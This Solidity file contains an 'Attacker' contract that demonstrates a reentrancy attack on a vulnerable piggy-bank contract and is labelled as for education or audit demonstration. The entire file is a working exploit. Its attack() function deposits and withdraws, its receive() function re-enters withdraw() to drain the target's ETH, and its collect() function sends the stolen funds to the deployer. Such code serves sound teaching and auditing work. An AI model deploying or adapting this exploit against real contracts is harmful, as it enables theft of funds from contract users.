// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title Attacker - Simulates a reentrancy attack on a vulnerable piggy bank contract
/// @notice This contract should only be used for educational or audit demonstration purposes

// Interface of the vulnerable target contract
interface IVulnerablePiggyBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerablePiggyBank public target; // reference to the vulnerable piggy bank
    address public owner;

    constructor(address _target) {
        // Store the address of the vulnerable contract
        target = IVulnerablePiggyBank(_target);
        owner = msg.sender;
    }

    /// @notice Fallback function triggered when this contract receives ETH
    /// @dev This is the core of the reentrancy attack
    receive() external payable {
        // Re-enter the vulnerable contract's withdraw() function
        // if the balance is still high enough
        if (address(target).balance >= 0.1 ether) {
            target.withdraw(); // recursive call to drain ETH
        }
    }

    /// @notice Begins the attack by depositing a small amount and then calling withdraw
    /// @dev This triggers the fallback to re-enter the target contract multiple times
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Send at least 0.1 ETH to attack");

        // First, deposit ETH into the vulnerable contract
        target.deposit{value: 0.1 ether}();

        // Then, initiate the exploit by calling withdraw
        target.withdraw();
    }

    /// @notice Allows the attacker (deployer) to collect stolen ETH
    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
